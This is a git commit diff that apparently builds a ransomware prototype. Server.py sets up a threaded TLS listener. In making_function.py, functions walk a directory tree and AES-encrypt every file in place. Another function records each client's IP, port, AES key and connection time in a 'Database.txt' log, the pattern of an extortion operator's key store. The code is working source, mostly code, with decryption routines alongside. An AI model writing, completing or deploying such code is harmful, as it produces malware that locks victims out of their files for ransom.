3f4f246a33f922cd92574790cc4e652496c06070
barfola <yehonatanbarfy@gmail.com>
2024-12-24 20:36:22 +0200

    Adding some necessary function. I added documentation.

--- Server.py
+++ Server.py
@@ -1,27 +1,48 @@
 import socket
 import ssl
+import threading
 
 SERVER_IP = '127.0.0.1'
 SERVER_PORT = 7777
 
-ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-ssl_context.load_cert_chain(certfile='server.crt', keyfile='server.key')
 
-server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server_socket.bind((SERVER_IP, SERVER_PORT))
-server_socket.listen(1)
+def wrap_socket_with_ssl_layer(socket_obj: socket.socket):
+    """
+    :param socket_obj: socket object
+    :return server_socket_ssl:
+    :return type: socket object
+    :Description: this function will wrap regular socket with ssl layer
+    for enhanced security. ssl_context is managing the setting of the ssl socket.
+    the "server.crt" is the certificate that I created for the server in order
+    to expose his identity to the client, also contains the public encryption key.
+    the "server.key" contains the decryption key.
+    """
+    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+    ssl_context.load_cert_chain(certfile='server.crt', keyfile='server.key')
+    server_socket_ssl = ssl_context.wrap_socket(socket_obj, server_side=True)
 
-server_socket_ssl = ssl_context.wrap_socket(server_socket, server_side=True)
+    return server_socket_ssl
 
-print(f"Server is up on {SERVER_PORT}")
 
-while True:
-    client_socket, addr = server_socket_ssl.accept()
-    print(f"Connection established with {addr}")
+def handle_client(client_socket: socket.socket, client_address):
+    print(f"New connection from {client_address}")
+    client_socket.send("Hello from the server".encode())
 
-    data = client_socket.recv(1024)
-    print(f"Received: {data.decode()}")
 
-    client_socket.send(b"Hello from the server!")
+def start_server(server_port, server_ip='127.0.0.1', waiting_list_size=1):
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.bind((server_ip, server_port))
+    server_socket.listen(waiting_list_size)
 
-    client_socket.close()
+    server_socket_ssl = wrap_socket_with_ssl_layer(server_socket)
+
+    print("Server is up and running on [127.0.0.1:7777]")
+
+    while True:
+        client_socket, client_address = server_socket_ssl.accept()
+
+        client_handler_thread = threading.Thread(target=handle_client, args=(client_socket, server_socket_ssl))
+        client_handler_thread.start()
+
+
+start_server(server_port=SERVER_PORT, server_ip=SERVER_IP, waiting_list_size=3)
--- making_function.py
+++ making_function.py
@@ -2,9 +2,21 @@ import os
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 from Crypto.Random import get_random_bytes
+import datetime
 
 
 def encrypt_file_with_aes(file_path, aes_encryption_key):
+    """
+    :param file_path: the file that will be encrypted.
+    :param aes_encryption_key: the encryption key length should be(16/24/32) byte according aes standards.
+    :return none:
+    :Description: this function encrypts file with aes encryption.
+    the aes mode is CBC which is secure, furthermore I used the
+    initialization vector(random 16 bytes) for more secure in order
+    that even same plaintext will produce different ciphertexts.
+    I created the new file in this way : the first 16 bytes contains
+    the initialization vector and the rest of the file is the ciphertext.
+    """
     with open(file_path, 'rb') as file:
         file_data = file.read()
 
@@ -18,6 +30,16 @@ def encrypt_file_with_aes(file_path, aes_encryption_key):
 
 
 def decrypt_file_with_aes(encrypted_file_path, aes_decryption_key):
+    """
+    :param encrypted_file_path: the file that will be decrypted.
+    :param aes_decryption_key: the decryption key length should be(16/24/32) byte according aes standards.
+    :return none:
+    :Description: this function decrypts file with aes encryption.
+    I read the first 16 bytes in order to get the initialization vector.
+    After that I read the rest of the file(ciphertext) in order to decrypt it.
+    I in the end I decrypt the file with the necessary parameters and write back
+    the plaintext to the file.
+    """
     with open(encrypted_file_path, 'rb') as encrypted_file:
         initialization_vector = encrypted_file.read(16)
 
@@ -30,12 +52,44 @@ def decrypt_file_with_aes(encrypted_file_path, aes_decryption_key):
         decrypted_file.write(decrypted_data)
 
 
-def encrypt_files(starting_directory):
-    for directory_path, sub_directories_names, file_names in os.walk(starting_directory):
-        pass
+def encrypt_files(starting_directory, aes_encryption_key):
+    """
+    :param starting_directory: starting point for the encryption.
+    :param aes_encryption_key: the encryption key length should be(16/24/32) byte according aes standards
+    :return none:
+    :Description: this function will iterate the file system from the starting directory
+    in order to encrypt the systems files by using the encrypt_file_with_aes.
+    """
+    for directory_path, sub_directories, files in os.walk(starting_directory):
+        for file_name in files:
+            file_path = os.path.join(directory_path, file_name)
+            encrypt_file_with_aes(file_path, aes_encryption_key)
 
 
-iv = get_random_bytes(16)
-aes_encryption_key = os.urandom(32)
-encrypt_file_with_aes("try_to_encrypt.txt", aes_encryption_key)
-#decrypt_file_with_aes("try_to_encrypt.txt", aes_encryption_key)
+def decrypt_files(starting_directory, aes_encryption_key):
+    """
+       :param starting_directory: starting point for the decryption.
+       :param aes_encryption_key: the decryption key length should be(16/24/32) byte according aes standards
+       :return none:
+       :Description: this function will iterate the file system from the starting directory
+       in order to decrypt the systems files by using the decrypt_file_with_aes.
+       """
+    for directory_path, sub_directories, files in os.walk(starting_directory):
+        for file_name in files:
+            file_path = os.path.join(directory_path, file_name)
+            decrypt_file_with_aes(file_path, aes_encryption_key)
+
+
+def store_client_info(client_ip, client_port, client_aes_encryption_key, client_connection_time):
+    client_info = (f"Client ip : {client_ip} | "
+                   f"Client port : {client_port} | "
+                   f"Client aes encryption key : {client_aes_encryption_key} | "
+                   f"Client connection time : {client_connection_time}.\n")
+
+    with open("Database.txt", "a+") as database_file:
+        database_file.write(client_info)
+
+
+key = os.urandom(32)
+encrypt_files("D:\\MyData\\encryption_testing", key)
+#decrypt_files("D:\\MyData\\encryption_testing", key)
